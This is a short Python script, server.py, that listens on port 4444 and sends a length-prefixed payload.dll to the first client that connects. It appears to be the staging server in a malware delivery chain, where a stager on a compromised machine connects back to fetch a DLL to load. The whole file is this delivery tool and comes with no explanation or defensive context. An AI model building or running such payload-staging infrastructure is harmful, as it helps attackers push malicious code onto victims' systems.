# server.py

import socket
import struct

HOST = "0.0.0.0"
PORT = 4444
DLL_PATH = "payload.dll"

def main():
    with open(DLL_PATH, "rb") as f:
        dll_bytes = f.read()

    dll_len = len(dll_bytes)
    print(f"[*] Loaded payload.dll: {dll_len} bytes")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((HOST, PORT))
        srv.listen(1)
        print(f"[*] Listening on {HOST}:{PORT}...")

        conn, addr = srv.accept()
        print(f"[+] Connection from {addr}")
        with conn:
            conn.sendall(struct.pack("<I", dll_len))
            conn.sendall(dll_bytes)
            print(f"[+] Sent {dll_len} bytes")

if __name__ == "__main__":
    main()